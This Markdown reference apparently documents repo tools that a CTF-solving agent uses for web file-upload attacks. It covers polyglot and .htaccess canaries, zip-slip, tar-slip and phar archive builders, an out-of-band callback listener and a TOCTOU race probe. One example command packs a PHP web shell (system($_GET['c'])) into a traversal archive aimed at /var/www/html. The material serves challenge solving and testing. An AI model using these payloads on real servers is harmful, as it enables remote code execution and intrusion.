# Tooling — repo tools for upload work (real flags only)

## `tools/web/upload_probe.py` — canary generation + serve classification

Two subcommands:

### `gen` — mint the canary set

```bash
python3 tools/web/upload_probe.py gen --dir up/ [--mark MARK]
```

Writes a deterministic set: marker text, PHP-in-GIF/PNG polyglots,
`.phtml`/`.PhP`, SVG-with-script, `.htaccess` — the probe files without
needing any other tool on the box.

### `verify` — classify what the server did with a fetched file

```bash
python3 tools/web/upload_probe.py verify --url <served-url> \
  [--expect-source '<?php'] [--timeout N]
```

Verdicts: `served-raw` (source visible — file stored verbatim),
`executed-or-transformed` (bytes changed — ran or processed), `blocked`,
`gone`. This is the graded answer to "did it execute" — never infer it
from upload status.

## `tools/web/archive_gen.py` — hostile archives without tar/zip/PHP

```bash
python3 tools/web/archive_gen.py zipslip --out evil.zip --name shell.php \
  --content '<?php system($_GET["c"]); ?>' --depth 8 [--absolute]
python3 tools/web/archive_gen.py tarslip --out evil.tar --name shell.php \
  --content '...' --depth 8 [--link-target /var/www/html --link-name link]
python3 tools/web/archive_gen.py phar --out x.phar --metadata 'O:1:"X":0:{}' \
  [--marker] [--content 'stub bytes'] [--alias a]
```

`zipslip` = traversal entries; `tarslip` = traversal + optional symlink
member; `phar` = PHP archive with controlled serialized metadata (the
`phar://` unserialize sink).

## `tools/web/http_probe.py` — the probe+evidence shape

The sanctioned probe path — emits the complete `hooks.py post-probe`
command with `--response` filled in. For uploads:

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-file-upload \
  --url "$BASE/upload" --method POST \
  --header 'Content-Type: multipart/form-data; boundary=X' \
  --body $'--X\r\nContent-Disposition: form-data; name="f"; filename="m.txt"\r\n\r\nMARKER\r\n--X--\r\n' \
  --evidence-regex '"(?:path|url|filename|id)"' --evidence-kind surface \
  --on-match inconclusive --on-miss inconclusive --write-ack
```

`--write-ack` is required — upload endpoints write. `surface` is the right
evidence kind for an accept response; `class`/`impact` only once the file
*executes* or *lands over something*.

## `tools/web/pdf_text.py` — read generated PDFs back

When the attack writes INTO a generated PDF (latex `\input`, wkhtmltopdf
HTML injection):

```bash
python3 tools/web/pdf_text.py <generated.pdf|url> --find-flag
python3 tools/web/pdf_text.py "$BASE/report/x.pdf" --grep 'flag\{|FLAG'
```

## `tools/web/oob_listener.py` — blind callbacks

For XXE/SSRF/callback payloads inside uploads:

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name svg1
python3 tools/web/oob_listener.py hits --log hits.jsonl
```

Each payload gets a unique canary path; hits are JSONL-correlated — a hit
proves the consumer ran, a silence is a measured negative (not "failed").

## `tools/web/race_probe.py` — the TOCTOU window

For validate-then-delete / rename races — `race-and-temp-files.md`:

```bash
# A/B race: arm A uploads, arm B fetches, interleaved a,b,a,b
python3 tools/web/race_probe.py --challenge "$C" --class web-file-upload \
  --url "$BASE/upload" --method POST \
  -H 'Content-Type: multipart/form-data; boundary=X' \
  --body $'--X\r\nContent-Disposition: form-data; name="f"; filename="m.php"\r\n\r\nMARKER\r\n--X--\r\n' \
  --url-b "$BASE/uploads/m.php" --method-b GET \
  --count 200 --concurrency 8 --write-ack
```

Serial baseline first — a signature that also appears serially is not a
race. `--dry-run` prints what would be sent without sending.

## `tools/hooks.py` — the write gate (unchanged contract)

`pre-flag`/`post-probe` — a flag-shaped string is a candidate until it
came from a live response/artifact through the gate.

## Standard binaries — what's on the box

Present: `ffuf`, `gobuster`, `feroxbuster` (path discovery),
`exiftool` (metadata), `binwalk` (polyglot/carve), `curl`, `sqlmap`,
`nmap`, `john`, `hashcat`, `tshark`, `xxd`, `socat`, `gcc`, `docker`.

Absent: `pwntools`, `gdb`, `imagemagick`/`convert`/`magick` (verify with
`which` — needed only locally, not on target), `zip`/`unzip`/`tar` may be
present — `archive_gen.py` is the guaranteed path.

## What not to hand-roll

| Instead of | Use |
|---|---|
| hand-crafting a zip-slip | `archive_gen.py zipslip` |
| hand-crafting a phar | `archive_gen.py phar` |
| an eyeball check on the fetch | `upload_probe.py verify` |
| a raw curl probe | `http_probe.py` (evidence shape) |
| guessing the serve path | `retrieval.md` + `ffuf`/`feroxbuster` |
